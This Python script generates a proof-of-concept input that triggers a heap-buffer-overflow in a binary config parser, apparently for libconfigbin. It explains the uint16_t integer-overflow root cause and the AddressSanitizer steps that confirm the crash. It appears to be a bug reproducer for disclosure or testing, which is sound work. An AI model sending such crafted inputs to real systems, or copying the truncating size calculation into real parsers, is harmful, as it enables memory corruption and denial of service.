#!/usr/bin/env python3
"""
gen_poc.py -- generate the proof-of-concept crashing input for libconfigbin.

Bug: heap-buffer-overflow in bcfg_parse_array() (src/value.c)
Root cause: integer overflow when computing `total_bytes = (uint16_t)(count * elem_size)`.
  elem_type = BCFG_TYPE_INT64 (0x02, elem_size = 8)
  count     = 8193  (0x2001)
  8193 * 8  = 65544, which wraps to 8 in uint16_t.
  malloc(8) is called, then memcpy writes 65544 bytes -> heap overflow.

Run:
  python3 gen_poc.py
  # produces poc.bin

Verify (requires ASAN build):
  clang -fsanitize=address -I src \
        src/configbin.c src/value.c src/frame.c \
        -o /tmp/bcfg_asan \
        -x c - <<'EOF'
  #include <stdio.h>
  #include <stdlib.h>
  #include "src/configbin.h"
  int main(int argc, char **argv){
      FILE *f=fopen(argv[1],"rb"); fseek(f,0,SEEK_END);
      long n=ftell(f); rewind(f);
      unsigned char *buf=malloc(n); fread(buf,1,n,f); fclose(f);
      bcfg_doc *doc=NULL;
      bcfg_parse(buf,n,&doc);
      bcfg_free(doc); free(buf);
  }
  EOF
  /tmp/bcfg_asan poc.bin
  # Expected: AddressSanitizer: heap-buffer-overflow in bcfg_parse_array
"""

import struct

BCFG_MAGIC   = b'BCFG'
BCFG_VERSION = 1

ELEM_TYPE_INT64 = 0x02   # 8 bytes each
OVERFLOW_COUNT  = 8193   # 8193 * 8 = 65544 -> truncates to 8 in uint16_t

def build_poc():
    # --- header ---
    buf  = BCFG_MAGIC
    buf += struct.pack('<H', BCFG_VERSION)
    buf += struct.pack('<H', 1)           # num_sections = 1

    # --- section: name = "S" ---
    buf += struct.pack('B', 1) + b'S'    # name_len=1, name="S"
    buf += struct.pack('<I', 1)           # num_entries = 1

    # --- entry: key="k", type=ARRAY ---
    buf += struct.pack('B', 1) + b'k'    # key_len=1, key="k"
    buf += b'\x06'                        # BCFG_TYPE_ARRAY
    buf += struct.pack('B', ELEM_TYPE_INT64)          # elem_type
    buf += struct.pack('<H', OVERFLOW_COUNT)           # count = 8193

    # Provide enough source bytes so the memcpy reads valid memory
    # (the heap overflow is a *write* overflow, not a read overflow).
    # count * elem_size = 8193 * 8 = 65544 bytes of payload.
    buf += b'\xAA' * (OVERFLOW_COUNT * 8)

    return buf

if __name__ == '__main__':
    poc = build_poc()
    out = 'poc.bin'
    with open(out, 'wb') as f:
        f.write(poc)
    print(f'Wrote {out} ({len(poc)} bytes).')
    print()
    print('Bug: heap-buffer-overflow in bcfg_parse_array() (src/value.c)')
    print(f'  elem_type = INT64 (8 bytes), count = {OVERFLOW_COUNT}')
    print(f'  overflow:  {OVERFLOW_COUNT} * 8 = {OVERFLOW_COUNT*8}'
          f'  -> uint16_t truncates to {(OVERFLOW_COUNT*8) & 0xFFFF}')
    print(f'  malloc({(OVERFLOW_COUNT*8) & 0xFFFF}) but memcpy({OVERFLOW_COUNT*8})')
